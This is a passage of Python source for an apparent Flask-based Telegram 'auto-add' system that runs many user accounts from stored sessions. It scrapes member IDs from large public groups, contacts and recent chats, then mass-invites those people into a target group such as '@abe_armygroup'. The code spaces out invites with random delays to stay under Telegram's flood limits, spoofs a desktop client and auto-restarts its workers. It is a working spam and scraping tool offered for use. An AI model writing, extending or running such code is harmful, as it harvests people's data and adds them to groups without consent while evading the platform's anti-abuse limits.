                await self.check_rate_limit(f'search_{term}', 3)
                results = await asyncio.wait_for(
                    client(functions.contacts.SearchRequest(q=term, limit=20)),
                    timeout=10
                )
                
                for chat in results.chats:
                    try:
                        if hasattr(chat, 'participants_count') and chat.participants_count:
                            if chat.participants_count > 1000 and chat.username:
                                group_tag = f'@{chat.username}'
                                if group_tag not in already_scraped:
                                    new_groups.add(group_tag)
                                    logger.info(f"   🔎 Discovered: {group_tag} ({chat.participants_count} members)")
                    except Exception:
                        continue
                        
            except asyncio.TimeoutError:
                continue
            except Exception:
                continue
        
        logger.info(f"✅ Discovered {len(new_groups)} new groups")
        return list(new_groups)

# Global scraper instance
scraper = MemberScraper()

# ==================== MEMBER POOL MANAGEMENT ====================

class MemberPool:
    """Manages member pools for each account"""
    
    @staticmethod
    def get_pool(account_key):
        """Get or create pool for account"""
        if account_key not in added_members_pool:
            added_members_pool[account_key] = {
                'all_scraped': [],
                'already_added': [],
                'failed_to_add': []
            }
        return added_members_pool[account_key]
    
    @staticmethod
    def get_available(account_key):
        """Get available members to add"""
        pool = MemberPool.get_pool(account_key)
        all_scraped = set(pool.get('all_scraped', []))
        already_added = set(pool.get('already_added', []))
        failed = set(pool.get('failed_to_add', []))
        return list(all_scraped - already_added - failed)
    
    @staticmethod
    def mark_added(account_key, user_id):
        """Mark a member as added"""
        pool = MemberPool.get_pool(account_key)
        already_added = set(pool.get('already_added', []))
        already_added.add(user_id)
        pool['already_added'] = list(already_added)
    
    @staticmethod
    def mark_failed(account_key, user_id):
        """Mark a member as failed"""
        pool = MemberPool.get_pool(account_key)
        failed = set(pool.get('failed_to_add', []))
        failed.add(user_id)
        pool['failed_to_add'] = list(failed)
    
    @staticmethod
    def add_to_scraped(account_key, new_members):
        """Add members to scraped pool"""
        pool = MemberPool.get_pool(account_key)
        all_scraped = set(pool.get('all_scraped', []))
        all_scraped.update(new_members)
        pool['all_scraped'] = list(all_scraped)
    
    @staticmethod
    def save(account_key):
        """Save pool to file"""
        try:
            added_members_pool[account_key] = MemberPool.get_pool(account_key)
            save_json(ADDED_MEMBERS_FILE, added_members_pool)
            return True
        except Exception as e:
            logger.error(f"Error saving member pool: {e}")
            return False
    
    @staticmethod
    def get_stats(account_key):
        """Get pool statistics"""
        pool = MemberPool.get_pool(account_key)
        total_scraped = len(pool.get('all_scraped', []))
        already_added = len(pool.get('already_added', []))
        failed = len(pool.get('failed_to_add', []))
        
        return {
            'total_scraped': total_scraped,
            'already_added': already_added,
            'failed': failed,
            'available': total_scraped - already_added - failed
        }

# ==================== TARGET GROUP JOINER ====================

class TargetGroupJoiner:
    """Handles joining target groups with retry logic"""
    
    @staticmethod
    async def join(client, account_id, target_group, max_retries=3):
        """
        Join target group with exponential backoff
        Returns: (entity, success_bool)
        """
        # Format group identifier
        if not target_group.startswith('@') and not target_group.startswith('https://'):
            target_group = '@' + target_group
        elif target_group.startswith('https://t.me/'):
            target_group = '@' + target_group.replace('https://t.me/', '')
        
        logger.info(f"🔄 JOIN: Attempting to join {target_group} (Account: {account_id})")
        
        for attempt in range(max_retries):
            try:
                # Get entity with timeout
                entity = await asyncio.wait_for(
                    client.get_entity(target_group),
                    timeout=15
                )
                
                try:
                    await client(functions.channels.JoinChannelRequest(entity))
                    logger.info(f"✅ JOINED: Successfully joined {target_group}")
                    return entity, True
                    
                except errors.UserAlreadyParticipantError:
                    logger.info(f"✅ JOINED: Already member of {target_group}")
                    return entity, True
                    
                except errors.FloodWaitError as e:
                    wait_time = min(e.seconds, 300)
                    logger.warning(f"⏳ Flood wait {e.seconds}s while joining")
                    await asyncio.sleep(wait_time)
                    
                except Exception as e:
                    if 'already' in str(e).lower() or 'participant' in str(e).lower():
                        logger.info(f"✅ JOINED: Already member (detected from error)")
                        return entity, True
                    
                    logger.warning(f"Join attempt {attempt + 1}/{max_retries} failed: {type(e).__name__}")
                    
                    if attempt < max_retries - 1:
                        wait_time = min(5 * (2 ** attempt), 60)  # Exponential backoff
                        await asyncio.sleep(wait_time)
                        
            except asyncio.TimeoutError:
                logger.warning(f"⏱️ Timeout joining {target_group} (attempt {attempt + 1})")
                if attempt < max_retries - 1:
                    await asyncio.sleep(10)
                    
            except errors.ChannelPrivateError:
                logger.error(f"🔒 Cannot join {target_group}: Channel is private")
                return None, False
                
            except errors.InviteHashExpiredError:
                logger.error(f"⏰ Cannot join {target_group}: Invite expired")
                return None, False
                
            except Exception as e:
                logger.error(f"Join error: {type(e).__name__}: {str(e)[:100]}")
                if attempt < max_retries - 1:
                    await asyncio.sleep(random.randint(10, 20))
        
        logger.error(f"❌ Failed to join {target_group} after {max_retries} attempts")
        return None, False

# ==================== MAIN AUTO-ADD WORKER ====================

class AutoAddWorker:
    """Main auto-add worker with comprehensive error handling"""
    
    def __init__(self, account):
        self.account = account
        self.account_id = account['id']
        self.account_key = str(account['id'])
        self.account_name = account.get('name', 'Unknown')
        
        # State tracking
        self.joined_target = False
        self.join_attempts = 0
        self.max_join_attempts = 5
        self.consecutive_errors = 0
        self.max_consecutive_errors = 20
        self.running = True
        self.last_heartbeat = time.time()
        
        # Stats
        self.stats = {
            'session_added': 0,
            'session_start': datetime.now(),
            'last_pool_build': None,
            'errors': 0,
            'restarts': 0
        }
        
        # Load previous state
        if self.account_key in auto_add_state:
            state = auto_add_state[self.account_key]
            self.joined_target = state.get('joined_target', False)
            self.join_attempts = state.get('join_attempts', 0)
            self.stats['session_added'] = state.get('session_added', 0)
    
    def save_state(self):
        """Save current state"""
        try:
            auto_add_state[self.account_key] = {
                'joined_target': self.joined_target,
                'join_attempts': self.join_attempts,
                'session_added': self.stats['session_added'],
                'session_start': self.stats['session_start'].isoformat() if self.stats['session_start'] else None,
                'last_pool_build': self.stats['last_pool_build'].isoformat() if self.stats['last_pool_build'] else None,
                'errors': self.stats['errors'],
                'last_active': datetime.now().isoformat()
            }
            save_auto_add_state()
        except Exception:
            pass
    
    def should_stop(self):
        """Check if worker should stop"""
        if self.account_key not in auto_add_settings:
            return True
        
        if not auto_add_settings[self.account_key].get('enabled', False):
            logger.info(f"⏹️ Auto-add disabled for {self.account_name}")
            return True
        
        # Check heartbeat - if no activity for 1 hour, restart
        if time.time() - self.last_heartbeat > 3600:
            logger.warning(f"💀 Heartbeat timeout for {self.account_name}")
            self.stats['restarts'] += 1
            return True
        
        return False
    
    async def create_client(self):
        """Create and connect Telegram client"""
        try:
            client = TelegramClient(
                StringSession(self.account['session']),
                API_ID,
                API_HASH,
                connection_retries=5,
                retry_delay=3,
                timeout=30,
                device_model="Desktop",
                system_version="Windows 10",
                app_version="1.0"
            )
            
            await asyncio.wait_for(client.connect(), timeout=20)
            
            if not await client.is_user_authorized():
                logger.error(f"❌ Account {self.account_id} not authorized")
                remove_invalid_account(self.account_id)
                return None
            
            return client
            
        except asyncio.TimeoutError:
            logger.error(f"⏱️ Timeout connecting client for {self.account_name}")
            return None
        except Exception as e:
            logger.error(f"❌ Client creation error: {type(e).__name__}: {str(e)[:100]}")
            return None
    
    async def join_target_group(self, client):
        """Join target group with retry logic"""
        if self.joined_target:
            return True
        
        if self.join_attempts >= self.max_join_attempts:
            logger.warning(f"⏸️ Max join attempts ({self.max_join_attempts}) reached for {self.account_name}")
            await asyncio.sleep(300)  # Wait 5 minutes
            self.join_attempts = 0  # Reset
            return False
        
        settings = auto_add_settings.get(self.account_key, {})
        target_group = settings.get('target_group', '@abe_armygroup')
        
        self.join_attempts += 1
        logger.info(f"🔄 JOIN ATTEMPT {self.join_attempts}/{self.max_join_attempts} for {target_group}")
        
        entity, success = await TargetGroupJoiner.join(
            client, self.account_id, target_group, max_retries=3
        )
        
        if success:
            self.joined_target = True
            self.join_attempts = 0
            self.save_state()
            logger.info(f"✅ AUTO-JOIN SUCCESS on attempt {self.join_attempts}")
            return True
        else:
            logger.warning(f"❌ Join attempt {self.join_attempts} failed")
            wait_time = random.randint(30, 60)
            await asyncio.sleep(wait_time)
            return False
    
    async def build_member_pool(self, client):
        """Build pool of members to add"""
        try:
            settings = auto_add_settings.get(self.account_key, {})
            source_groups = settings.get('source_groups', DEFAULT_SOURCE_GROUPS)
            scrape_limit = settings.get('scrape_limit_per_group', 500)
            
            logger.info("="*50)
            logger.info(f"🏗️ BUILDING MEMBER POOL for {self.account_name}")
            
            new_members = set()
            
            # Scrape source groups
            if settings.get('use_scraping', True):
                for group in source_groups:
                    if not group or not group.strip():
                        continue
                    
                    try:
                        members = await scraper.scrape_group(client, group, scrape_limit)
                        new_members.update(members)
                        await asyncio.sleep(random.randint(2, 5))  # Random delay
                    except Exception as e:
                        logger.error(f"Error scraping {group}: {type(e).__name__}")
                        continue
            
            # Get contacts
            if settings.get('use_contacts', True):
                try:
                    contacts = await scraper.get_contacts(client)
                    new_members.update(contacts)
                    await asyncio.sleep(1)
                except Exception as e:
                    logger.error(f"Error getting contacts: {type(e).__name__}")
            
            # Get dialogs
            if settings.get('use_recent_chats', True):
                try:
                    dialogs = await scraper.get_dialogs(client)
                    new_members.update(dialogs)
                    await asyncio.sleep(1)
                except Exception as e:
                    logger.error(f"Error getting dialogs: {type(e).__name__}")
            
            # Discover new groups
            if settings.get('use_scraping', True):
                try:
                    already_scraped = set(source_groups)
                    new_groups = await scraper.discover_groups(client, already_scraped)
                    
                    for group in new_groups[:10]:
                        try:
                            members = await scraper.scrape_group(client, group, 300)
                            new_members.update(members)
                            await asyncio.sleep(2)
                        except Exception:
                            continue
                except Exception as e:
                    logger.error(f"Error discovering groups: {type(e).__name__}")
            
            # Save to pool
            MemberPool.add_to_scraped(self.account_key, new_members)
            MemberPool.save(self.account_key)
            
            stats = MemberPool.get_stats(self.account_key)
            
            logger.info(f"📊 POOL STATS:")
            logger.info(f"   Total: {stats['total_scraped']} | Available: {stats['available']}")
            logger.info(f"   Added: {stats['already_added']} | Failed: {stats['failed']}")
            logger.info("="*50)
            
            self.stats['last_pool_build'] = datetime.now()
            self.save_state()
            
            return MemberPool.get_available(self.account_key)
            
        except Exception as e:
            logger.error(f"❌ Pool building error: {type(e).__name__}: {str(e)[:100]}")
            return MemberPool.get_available(self.account_key)
    
    async def add_members(self, client, available_members):
        """Add members to target group"""
        settings = auto_add_settings.get(self.account_key, {})
        target_group = settings.get('target_group', '@abe_armygroup')
        daily_limit = settings.get('daily_limit', 200)
        
        # Format target group
        if not target_group.startswith('@'):
            target_group = '@' + target_group
        
        # Get target entity
        try:
            target_entity = await asyncio.wait_for(
                client.get_entity(target_group),
                timeout=10
            )
        except Exception as e:
            logger.error(f"❌ Cannot get target group: {type(e).__name__}")
            self.joined_target = False
            return 0
        
        # Get existing members
        existing = set()
        try:
            async for user in client.iter_participants(target_entity, limit=5000):
                if user and user.id:
                    existing.add(user.id)
        except Exception:
            pass
        
        # Filter fresh members
        fresh_members = [m for m in available_members if m not in existing]
        logger.info(f"🎯 Ready to add: {len(fresh_members)} new members")
        
        if not fresh_members:
            return 0
        
        # Reset daily counter
        today = datetime.now().strftime('%Y-%m-%d')
        if settings.get('last_reset') != today:
            settings['added_today'] = 0
            settings['last_reset'] = today
        
        # Check daily limit
        if settings.get('added_today', 0) >= daily_limit:
            logger.info(f"📊 Daily limit reached: {daily_limit}")
            return 0
        
        added_count = 0
        errors_in_row = 0
        
        for user_id in fresh_members:
            try:
                # Check if should stop
                if self.should_stop():
                    break
                
                # Check daily limit
                if settings.get('added_today', 0) >= daily_limit:
                    break
                
                # Add member
                try:
                    user_entity = await asyncio.wait_for(
                        client.get_input_entity(user_id),
                        timeout=5
                    )
                    
                    await asyncio.wait_for(
                        client(functions.channels.InviteToChannelRequest(
                            target_entity,
                            [user_entity]
                        )),
                        timeout=10
                    )
                    
                    # Update counters
                    settings['added_today'] = settings.get('added_today', 0) + 1
                    settings['total_added'] = settings.get('total_added', 0) + 1
                    settings['last_added'] = datetime.now().isoformat()
                    added_count += 1
                    self.stats['session_added'] += 1
                    
                    MemberPool.mark_added(self.account_key, user_id)
                    
                    # Log progress
                    if added_count % 10 == 0:
                        logger.info(f"✅ Added [{settings['added_today']}/{daily_limit}] "
                                  f"| Round: {added_count} | Total: {settings['total_added']}")
                        MemberPool.save(self.account_key)
                        save_json(AUTO_ADD_SETTINGS_FILE, auto_add_settings)
                        self.save_state()
                    
                    errors_in_row = 0
                    
                    # Delay between adds
                    if added_count % 10 == 0:
                        await asyncio.sleep(random.randint(20, 35))
                    else:
                        await asyncio.sleep(random.randint(8, 15))
                    
                except errors.FloodWaitError as e:
                    logger.warning(f"⏳ Flood wait {e.seconds}s")
                    if e.seconds < 3600:
                        await asyncio.sleep(e.seconds + 5)
                    else:
                        await asyncio.sleep(600)
                    
                except errors.UserPrivacyRestrictedError:
                    MemberPool.mark_failed(self.account_key, user_id)
                    continue
                    
                except (errors.UserNotMutualContactError, errors.UserAlreadyParticipantError,
                        errors.UserKickedError, errors.UserBannedInChannelError):
                    MemberPool.mark_failed(self.account_key, user_id)
                    continue
                    
                except asyncio.TimeoutError:
                    errors_in_row += 1
                    continue
                    
                except Exception as e:
                    errors_in_row += 1
                    logger.error(f"Error adding {user_id}: {type(e).__name__}")
                    
                    if errors_in_row >= 10:
                        logger.warning(f"⚠️ {errors_in_row} consecutive errors, taking break...")
                        await asyncio.sleep(300)
                        errors_in_row = 0
                    continue
                    
            except Exception as e:
                logger.error(f"Unexpected error in add loop: {type(e).__name__}")
                continue
        
        # Save state
        MemberPool.save(self.account_key)
        save_json(AUTO_ADD_SETTINGS_FILE, auto_add_settings)
        self.save_state()
        
        return added_count
    
    async def run(self):
        """Main worker loop"""
        logger.info("="*60)
        logger.info(f"🚀 AUTO-ADD WORKER STARTED: {self.account_name}")
        logger.info(f"   Target: {auto_add_settings.get(self.account_key, {}).get('target_group', '@abe_armygroup')}")
        logger.info(f"   Joined: {self.joined_target}")
        logger.info("="*60)
        
        while self.running:
            try:
                # Check if should stop
                if self.should_stop():
                    logger.info(f"⏹️ Stopping worker for {self.account_name}")
                    break
                
                self.last_heartbeat = time.time()
                
                # Create client
                client = await self.create_client()
                if not client:
                    logger.error(f"❌ Cannot create client, waiting 60s...")
                    await asyncio.sleep(60)
                    continue
                
                try:
                    # Join target group
                    if not self.joined_target:
                        joined = await self.join_target_group(client)
                        if not joined:
                            logger.info(f"🔄 Cannot join target group, waiting...")
                            await asyncio.sleep(random.randint(60, 120))
                            continue
                    
                    # Build member pool
                    available = MemberPool.get_available(self.account_key)
                    
                    if not available or not self.stats['last_pool_build'] or \
                       (datetime.now() - self.stats['last_pool_build']).total_seconds() > 21600:
                        available = await self.build_member_pool(client)
                    
                    if not available:
                        logger.info("😴 No members available, waiting 30 minutes...")
                        await asyncio.sleep(1800)
                        continue
                    
                    # Add members
                    added = await self.add_members(client, available)
                    
                    # Summary
                    elapsed = (datetime.now() - self.stats['session_start']).total_seconds()
                    rate = self.stats['session_added'] / (elapsed / 3600) if elapsed > 0 else 0
                    
                    logger.info("="*50)
                    logger.info(f"📈 ROUND SUMMARY for {self.account_name}:")
                    logger.info(f"   Added this round: {added}")
                    logger.info(f"   Session total: {self.stats['session_added']}")
                    logger.info(f"   Rate: {rate:.1f}/hour | Time: {elapsed/3600:.1f}h")
                    logger.info(f"   Errors: {self.stats['errors']}")
                    logger.info("="*50)
                    
                    # Wait before next round
                    wait = random.randint(60, 120) if added > 0 else random.randint(300, 600)
                    logger.info(f"⏰ Next round in {wait}s...")
                    await asyncio.sleep(wait)
                    
                except Exception as e:
                    logger.error(f"❌ Worker loop error: {type(e).__name__}: {str(e)[:200]}")
                    logger.error(traceback.format_exc())
                    self.stats['errors'] += 1
                    self.consecutive_errors += 1
                    
                    if self.consecutive_errors >= self.max_consecutive_errors:
                        logger.error(f"💀 Too many consecutive errors ({self.consecutive_errors}), restarting...")
                        self.consecutive_errors = 0
                        break
                    
                    await asyncio.sleep(60)
                    
                finally:
                    try:
                        if client:
                            await client.disconnect()
                    except Exception:
                        pass
                    
                    self.consecutive_errors = 0
                
            except Exception as e:
                logger.error(f"❌ Critical worker error: {type(e).__name__}: {str(e)[:200]}")
                logger.error(traceback.format_exc())
                self.stats['errors'] += 1
                self.consecutive_errors += 1
                
                if self.consecutive_errors >= self.max_consecutive_errors:
                    logger.error(f"💀 Too many consecutive errors ({self.consecutive_errors}), stopping...")
                    break
                
                await asyncio.sleep(60)
        
        logger.info(f"⏹️ Worker stopped for {self.account_name}")
        self.save_state()

# ==================== WORKER MANAGER ====================

class AutoAddManager:
    """Manages all auto-add workers"""
    
    @staticmethod
    def start_for_account(account):
        """Start auto-add worker for an account"""
        account_key = str(account['id'])
        
        # Don't start if already running
        if account_key in active_auto_add_tasks:
            logger.info(f"⚠️ Auto-add already running for {account.get('name')}")
            return
        
        # Initialize settings if needed
        if account_key not in auto_add_settings:
            auto_add_settings[account_key] = {
                'enabled': True,
                'target_group': '@abe_armygroup',
                'delay_seconds': 15,
                'daily_limit': 200,
                'source_groups': DEFAULT_SOURCE_GROUPS,
                'use_contacts': True,
                'use_recent_chats': True,
                'use_scraping': True,
                'scrape_limit_per_group': 500,
                'skip_bots': True,
                'auto_join': True,
                'total_added': 0,
                'added_today': 0,
                'last_reset': datetime.now().strftime('%Y-%m-%d'),
                'last_added': None
            }
            save_json(AUTO_ADD_SETTINGS_FILE, auto_add_settings)
        
        # Start worker in thread
        def worker_thread():
            worker = AutoAddWorker(account)
            
            async def run_worker():
                try:
                    await worker.run()
                except Exception as e:
                    logger.error(f"❌ Worker thread error: {type(e).__name__}: {str(e)[:100]}")
                finally:
                    # Clean up
                    if account_key in active_auto_add_tasks:
                        del active_auto_add_tasks[account_key]
                    
                    # Auto-restart if settings still enabled
                    if account_key in auto_add_settings and auto_add_settings[account_key].get('enabled', False):
                        logger.info(f"🔄 Auto-restarting worker for {account.get('name')}...")
                        time.sleep(10)
                        AutoAddManager.start_for_account(account)
            
            run_async(run_worker())
        
        thread = threading.Thread(target=worker_thread, daemon=True, name=f"auto_add_{account_key}")
        thread.start()
        
        active_auto_add_tasks[account_key] = thread
        client_tasks[f"auto_add_{account_key}"] = thread
        
        logger.info(f"🚀 Auto-add worker started for {account.get('name')}")

    @staticmethod
    def stop_for_account(account_id):
        """Stop auto-add worker for an account"""
        account_key = str(account_id)
        
        if account_key in active_auto_add_tasks:
            # Mark as disabled
            if account_key in auto_add_settings:
                auto_add_settings[account_key]['enabled'] = False
                save_json(AUTO_ADD_SETTINGS_FILE, auto_add_settings)
            
            # Remove from tracking
            del active_auto_add_tasks[account_key]
            if f"auto_add_{account_key}" in client_tasks:
                del client_tasks[f"auto_add_{account_key}"]
            
            logger.info(f"⏹️ Stopped auto-add for account {account_id}")
            return True
        return False

    @staticmethod
    def start_all():
        """Start auto-add for all accounts on startup"""
        time.sleep(5)
        
        logger.info(f"🚀 Starting auto-add for {len(accounts)} accounts...")
        
        for account in accounts:
            account_key = str(account['id'])
            
            if auto_add_settings.get(account_key, {}).get('enabled', True):
                AutoAddManager.start_for_account(account)
                time.sleep(2)

    @staticmethod
    def get_status(account_id):
        """Get status of auto-add worker"""
        account_key = str(account_id)
        
        is_running = account_key in active_auto_add_tasks
        
        return {
            'running': is_running,
            'enabled': auto_add_settings.get(account_key, {}).get('enabled', False),
            'joined_target': auto_add_state.get(account_key, {}).get('joined_target', False),
            'session_added': auto_add_state.get(account_key, {}).get('session_added', 0)
        }

# ==================== AUTO-ADD API ENDPOINTS ====================

@app.route('/api/auto-add-settings', methods=['GET'])
def get_auto_add_settings():
    """Get auto-add settings for an account"""
    try:
        account_id = request.args.get('accountId')
        if not account_id:
            return jsonify({'success': False, 'error': 'Account ID required'})
        
        account_key = str(account_id)
        
        default_settings = {
            'enabled': True,
            'target_group': '@abe_armygroup',
            'delay_seconds': 15,
            'daily_limit': 200,
            'source_groups': DEFAULT_SOURCE_GROUPS,
            'use_contacts': True,
            'use_recent_chats': True,
            'use_scraping': True,
            'scrape_limit_per_group': 500,
            'skip_bots': True,
            'auto_join': True,
            'total_added': 0,
            'added_today': 0,
            'last_reset': datetime.now().strftime('%Y-%m-%d'),
            'last_added': None
        }
        
        if account_key in auto_add_settings:
            settings = auto_add_settings[account_key]
            # Fill in any missing defaults
            for key, value in default_settings.items():
                if key not in settings:
                    settings[key] = value
        else:
            settings = default_settings.copy()
            auto_add_settings[account_key] = settings
            save_json(AUTO_ADD_SETTINGS_FILE, auto_add_settings)
        
        # Add status info
        status = AutoAddManager.get_status(int(account_id))
        settings['_status'] = status
        settings['_pool_stats'] = MemberPool.get_stats(account_key)
        
        return jsonify({'success': True, 'settings': settings})
        
    except Exception as e:
        logger.error(f"Error getting auto-add settings: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/auto-add-settings', methods=['POST'])
def update_auto_add_settings():
    """Update auto-add settings for an account"""
    try:
        data = request.json
        if not data:
            return jsonify({'success': False, 'error': 'No data received'})
        
        account_id = data.get('accountId')
        if not account_id:
            return jsonify({'success': False, 'error': 'Account ID required'})
        
        account_key = str(account_id)
        
        if account_key not in auto_add_settings:
            auto_add_settings[account_key] = {}
        
        was_enabled = auto_add_settings[account_key].get('enabled', False)
        
        # Update settings
        updateable_keys = [
            'enabled', 'target_group', 'delay_seconds', 'daily_limit',
            'use_contacts', 'use_recent_chats', 'use_scraping',
            'scrape_limit_per_group', 'skip_bots', 'auto_join'
        ]
        
        for key in updateable_keys:
            if key in data:
                auto_add_settings[account_key][key] = data[key]
        
        if 'source_groups' in data:
            auto_add_settings[account_key]['source_groups'] = data['source_groups']
        
        save_json(AUTO_ADD_SETTINGS_FILE, auto_add_settings)
        
        # Handle enable/disable
        is_now_enabled = auto_add_settings[account_key].get('enabled', False)
        
        if is_now_enabled and not was_enabled:
            # Start worker
            account = next((acc for acc in accounts if acc['id'] == account_id), None)
            if account:
                AutoAddManager.start_for_account(account)
                logger.info(f"🚀 Started auto-add for account {account_id}")
        
        elif not is_now_enabled and was_enabled:
            # Stop worker
            AutoAddManager.stop_for_account(account_id)
            logger.info(f"⏹️ Stopped auto-add for account {account_id}")
        
        return jsonify({
            'success': True, 
            'message': 'Settings saved successfully',
            'enabled': is_now_enabled
        })
        
    except Exception as e:
        logger.error(f"Error updating auto-add settings: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/auto-add-stats', methods=['GET'])
def get_auto_add_stats():
    """Get auto-add statistics"""
    try:
        account_id = request.args.get('accountId')
        if not account_id:
            return jsonify({'success': False, 'error': 'Account ID required'})
        
        account_key = str(account_id)
        settings = auto_add_settings.get(account_key, {})
        pool_stats = MemberPool.get_stats(account_key)
        status = AutoAddManager.get_status(int(account_id))
        
        return jsonify({
            'success': True,
            'added_today': settings.get('added_today', 0),
            'total_added': settings.get('total_added', 0),
            'enabled': settings.get('enabled', False),
            'auto_join': settings.get('auto_join', True),
            'daily_limit': settings.get('daily_limit', 200),
            'target_group': settings.get('target_group', '@abe_armygroup'),
            'pool_size': pool_stats['total_scraped'],
            'available_to_add': pool_stats['available'],
            'already_added': pool_stats['already_added'],
            'failed': pool_stats['failed'],
            'last_reset': settings.get('last_reset', ''),
            'last_added': settings.get('last_added'),
            'worker_running': status['running'],
            'joined_target': status['joined_target'],
            'session_added': status['session_added']
        })
        
    except Exception as e:
        logger.error(f"Error getting auto-add stats: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/test-auto-add', methods=['POST'])
def test_auto_add():
    """Test auto-add functionality"""
    try:
        data = request.json
        account_id = data.get('accountId')
        
        if not account_id:
            return jsonify({'success': False, 'error': 'Account ID required'})
        
        account = next((acc for acc in accounts if acc['id'] == account_id), None)
        if not account:
            return jsonify({'success': False, 'error': 'Account not found'})
        
        async def run_test():
            client = None
            try:
                client = TelegramClient(
                    StringSession(account['session']),
                    API_ID,
                    API_HASH
                )
                await client.connect()
                
                if not await client.is_user_authorized():
                    return {'success': False, 'error': 'Account not authorized'}
                
                settings = auto_add_settings.get(str(account_id), {})
                target_group = settings.get('target_group', '@abe_armygroup')
                
                if not target_group.startswith('@'):
                    target_group = '@' + target_group
                
                # Test group
                group_found = False
                group_title = target_group
                already_member = False
                can_join = False
                
                try:
                    group = await client.get_entity(target_group)
                    group_found = True
                    group_title = getattr(group, 'title', target_group)
                    
                    try:
                        await client(functions.channels.JoinChannelRequest(group))
                        can_join = True
                    except errors.UserAlreadyParticipantError:
                        already_member = True
                        can_join = True
                    except Exception as e:
                        if 'already' in str(e).lower() or 'participant' in str(e).lower():
                            already_member = True
                            can_join = True
                except Exception as e:
                    return {
                        'success': False,
                        'error': f'Cannot access {target_group}: {type(e).__name__}'
                    }
                
                # Count members
                member_count = 0
                try:
                    async for _ in client.iter_participants(group, limit=10):
                        member_count += 1
                    # Multiply by rough estimate
                    member_count = member_count * 10 if member_count < 10 else "100+"
                except:
                    member_count = "Unknown"
                
                # Get available sources
                sources = []
                if settings.get('use_contacts', True):
                    try:
                        contacts = await client(functions.contacts.GetContactsRequest(0))
                        count = len([c for c in contacts.users if not c.bot])
                        sources.append(f"Contacts: {count}")
                    except:
                        pass
                
                return {
                    'success': True,
                    'group_found': group_found,
                    'group_title': group_title,
                    'already_member': already_member,
                    'can_join': can_join,
                    'member_count': member_count,
                    'available_sources': sources,
                    'will_auto_join': settings.get('auto_join', True)
                }
                
            except Exception as e:
                return {'success': False, 'error': f'Test failed: {type(e).__name__}: {str(e)[:100]}'}
            finally:
                if client:
                    try:
                        await client.disconnect()
                    except:
                        pass
        
        result = run_async(run_test())
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"Test auto-add error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/auto-join-group', methods=['POST'])
def auto_join_group():
    """Manually trigger group join"""
    try:
        data = request.json
        account_id = data.get('accountId')
        
        if not account_id:
            return jsonify({'success': False, 'error': 'Account ID required'})
        
        account = next((acc for acc in accounts if acc['id'] == account_id), None)
        if not account:
            return jsonify({'success': False, 'error': 'Account not found'})
        
        settings = auto_add_settings.get(str(account_id), {})
        target_group = data.get('targetGroup') or settings.get('target_group', '@abe_armygroup')
        
        async def join():
            client = None
            try:
                client = TelegramClient(
                    StringSession(account['session']),
                    API_ID,
                    API_HASH
                )
                await client.connect()
                
                if not await client.is_user_authorized():
                    return {'success': False, 'error': 'Account not authorized'}
                
                entity, joined = await TargetGroupJoiner.join(client, account_id, target_group)
                
                if entity and joined:
                    return {
                        'success': True,
                        'message': f'Successfully joined {target_group}',
                        'joined': True,
                        'group_title': getattr(entity, 'title', target_group)
                    }
                else:
                    return {
                        'success': False,
                        'error': f'Could not join {target_group}. Check if group exists and is accessible.'
                    }
                    
            except Exception as e:
                return {'success': False, 'error': f'Join error: {type(e).__name__}: {str(e)[:100]}'}
            finally:
                if client:
                    try:
                        await client.disconnect()
                    except:
                        pass
        
        result = run_async(join())
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"Auto-join endpoint error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/auto-add-restart', methods=['POST'])
def restart_auto_add():
    """Restart auto-add worker"""
    try:
        data = request.json
        account_id = data.get('accountId')
        
        if not account_id:
            return jsonify({'success': False, 'error': 'Account ID required'})
        
        account = next((acc for acc in accounts if acc['id'] == account_id), None)
        if not account:
            return jsonify({'success': False, 'error': 'Account not found'})
        
        # Stop existing
        AutoAddManager.stop_for_account(account_id)
        
        # Wait a moment
        time.sleep(2)
        
        # Reset state
        account_key = str(account_id)
        if account_key in auto_add_state:
            auto_add_state[account_key] = {}
            save_auto_add_state()
        
        # Enable settings
        if account_key in auto_add_settings:
            auto_add_settings[account_key]['enabled'] = True
            save_json(AUTO_ADD_SETTINGS_FILE, auto_add_settings)
        
        # Start fresh
        AutoAddManager.start_for_account(account)
        
        return jsonify({
            'success': True,
            'message': 'Auto-add worker restarted successfully'
        })
        
    except Exception as e:
        logger.error(f"Restart auto-add error: {e}")
        return jsonify({'success': False, 'error': str(e)})

# ==================== STARTUP ====================

def start_all_auto_add():
    """Start auto-add for all accounts on startup with delay"""
    try:
        time.sleep(8)  # Wait for other services to initialize
        
        logger.info("="*50)
        logger.info("🚀 INITIALIZING AUTO-ADD SYSTEM")
        logger.info("="*50)
        
        for account in accounts:
            account_key = str(account['id'])
            
            # Auto-enable if not configured
            if account_key not in auto_add_settings:
                auto_add_settings[account_key] = {
                    'enabled': True,
                    'target_group': '@abe_armygroup',
                    'delay_seconds': 15,
                    'daily_limit': 200,
                    'source_groups': DEFAULT_SOURCE_GROUPS,
                    'use_contacts': True,
                    'use_recent_chats': True,
                    'use_scraping': True,
                    'scrape_limit_per_group': 500,
                    'skip_bots': True,
                    'auto_join': True,
                    'total_added': 0,
                    'added_today': 0,
                    'last_reset': datetime.now().strftime('%Y-%m-%d'),
                    'last_added': None
                }
                save_json(AUTO_ADD_SETTINGS_FILE, auto_add_settings)
            
            if auto_add_settings[account_key].get('enabled', True):
                AutoAddManager.start_for_account(account)
                time.sleep(3)  # Stagger starts
        
        logger.info(f"✅ Auto-add system initialized for {len(active_auto_add_tasks)} accounts")
        
    except Exception as e:
        logger.error(f"❌ Error starting auto-add: {e}")

# ==================== AUTO ADD SYSTEM END ====================
# ==================== AUTO ADD SYSTEM END ====================

# ==================== ALL API ROUTES ====================

@app.route('/')
def home():
    return send_file('login.html')

@app.route('/login')
def login():
    return send_file('login.html')

@app.route('/dashboard')
def dashboard():
    return send_file('dashboard.html')

@app.route('/dash')
def dash():
    return send_file('dash.html')

@app.route('/all')
def all_sessions():
    return send_file('all.html')

@app.route('/auto-add')
def auto_add():
    return send_file('auto_add.html')

@app.route('/settings')
def settings():
    return send_file('settings.html')

@app.route('/fog')
def fog():
    return send_file('fog.html')

@app.route('/api/accounts', methods=['GET'])
def get_accounts():
    formatted = []
    for acc in accounts:
